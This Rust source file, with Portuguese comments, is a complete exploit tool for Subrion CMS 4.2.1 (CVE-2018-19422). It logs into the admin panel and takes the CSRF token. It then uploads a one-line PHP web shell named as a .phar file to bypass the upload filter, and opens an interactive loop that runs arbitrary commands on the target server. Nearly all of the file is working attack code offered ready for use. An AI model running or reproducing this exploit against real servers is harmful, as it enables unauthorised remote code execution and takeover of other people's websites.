use clap::{App, Arg};
use colored::*;
use rand::{distributions::Alphanumeric, Rng};
use reqwest::blocking::{Client, multipart};
use scraper::{Html, Selector};
use std::io::{self, Write};

fn main() {
    // Configuração dos argumentos de linha de comando com clap
    let matches = App::new("Subrion CMS Exploit")
        .version("1.0")
        .author("Fellipe Oliveira")
        .about("Exploit para Subrion CMS 4.2.1 - File Upload Bypass to RCE (Authenticated)")
        .arg(Arg::with_name("url")
            .short("u")
            .long("url")
            .value_name("URL")
            .help("URL base do painel do Subrion CMS (ex: http://target/panel)")
            .takes_value(true)
            .required(true))
        .arg(Arg::with_name("user")
            .short("l")
            .long("user")
            .value_name("USER")
            .help("Nome de usuário para login")
            .takes_value(true)
            .required(true))
        .arg(Arg::with_name("passw")
            .short("p")
            .long("passw")
            .value_name("PASSW")
            .help("Senha para login")
            .takes_value(true)
            .required(true))
        .get_matches();

    let url = matches.value_of("url").unwrap();
    let user = matches.value_of("user").unwrap();
    let passw = matches.value_of("passw").unwrap();

    println!("{} {}", "[+]".green(), "SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422".bold());

    // Criação do cliente HTTP com suporte a cookies
    let client = Client::builder()
        .cookie_store(true)
        .build()
        .expect("Falha ao criar o cliente HTTP");

    // Executando as etapas do exploit
    let csrf_token = login(&client, url, user, passw).expect("Falha ao fazer login");
    let shell_name = generate_shell_name();
    let url_upload = format!("{}/uploads/read.json", url);
    upload_shell(&client, &url_upload, &csrf_token, &shell_name).expect("Falha ao fazer upload do webshell");
    let url_shell = url.replace("/panel", "/uploads/");
    execute_commands(&client, &url_shell, &shell_name).expect("Falha ao executar comandos");
}

// Função de login: obtém o token CSRF e autentica o usuário
fn login(client: &Client, url: &str, user: &str, passw: &str) -> Result<String, Box<dyn std::error::Error>> {
    println!("{} {}", "[+]".green(), "Tentando conectar a:".bold());
    println!("{}", url);

    let get_resp = client.get(url).send()?;
    let body = get_resp.text()?;
    let document = Html::parse_document(&body);
    let selector = Selector::parse("input[name=__st]").unwrap();
    let csrf_token = document
        .select(&selector)
        .next()
        .ok_or("Token CSRF não encontrado")?
        .value()
        .attr("value")
        .ok_or("Valor do token CSRF não encontrado")?;

    println!("{} {}", "[+]".green(), "Token CSRF obtido:".bold());
    println!("{}", csrf_token);

    println!("{} {}", "[+]".green(), "Tentando fazer login...".bold());

    let login_data = [
        ("__st", csrf_token),
        ("username", user),
        ("password", passw),
    ];

    let login_resp = client.post(url).form(&login_data).send()?;
    let response_text = login_resp.text()?;

    if response_text.len() <= 7000 {
        println!("{} {}", "[x]".red(), "Falha no login... Verifique as credenciais".bold());
        std::process::exit(1);
    } else {
        println!("{} {}", "[+]".green(), "Login bem-sucedido!".bold());
    }

    Ok(csrf_token.to_string())
}

// Função para gerar um nome aleatório para o webshell
fn generate_shell_name() -> String {
    println!("{} {}", "[+]".green(), "Gerando nome aleatório para o webshell...".bold());
    let shell_name: String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(15)
        .map(char::from)
        .collect();
    println!("{} {}", "[+]".green(), "Nome do webshell gerado:".bold());
    println!("{}", shell_name);
    shell_name
}

// Função para fazer upload do webshell
fn upload_shell(client: &Client, url_upload: &str, csrf_token: &str, shell_name: &str) -> Result<(), Box<dyn std::error::Error>> {
    println!("{} {}", "[+]".green(), "Tentando fazer upload do webshell...".bold());

    let form = multipart::Form::new()
        .text("reqid", "17978446266285")
        .text("cmd", "upload")
        .text("target", "l1_Lw")
        .text("__st", csrf_token.to_string())
        .text("mtime[]", "1621210391")
        .part(
            "upload[]",
            multipart::Part::bytes(b"<?php system($_GET['cmd']); ?>".to_vec())
                .file_name(format!("{}.phar", shell_name))
                .mime_str("application/octet-stream")?,
        );

    let upload_resp = client.post(url_upload).multipart(form).send()?;

    if upload_resp.status().is_success() {
        println!("{} {}", "[+]".green(), "Upload bem-sucedido!".bold());
    } else {
        println!("{} {}", "[x]".red(), "Falha no upload do webshell".bold());
        std::process::exit(1);
    }

    Ok(())
}

// Função para executar comandos via webshell
fn execute_commands(client: &Client, url_shell: &str, shell_name: &str) -> Result<(), Box<dyn std::error::Error>> {
    let shell_url = format!("{}{}.phar", url_shell, shell_name);
    println!("{} {}", "[+]".green(), "Caminho do webshell:".bold());
    println!("{}", shell_url);

    // Verifica se o webshell foi carregado corretamente
    let test_resp = client.get(&format!("{}?cmd=id", shell_url)).send()?;
    if test_resp.status().is_success() {
        println!("{} {}", "[+]".green(), "Webshell ativo! Iniciando shell interativo...".bold());
    } else {
        println!("{} {}", "[x]".red(), "Webshell não encontrado... O upload pode ter falhado".bold());
        std::process::exit(1);
    }

    // Loop interativo para comandos
    loop {
        let cmd = input("$ ");
        let exec_url = format!("{}?cmd={}", shell_url, cmd);
        let resp = client.get(&exec_url).send()?;
        println!("{}", resp.text()?);
    }
}

// Função auxiliar para ler input do usuário
fn input(prompt: &str) -> String {
    print!("{}", prompt);
    io::stdout().flush().unwrap();
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    input.trim().to_string()
}
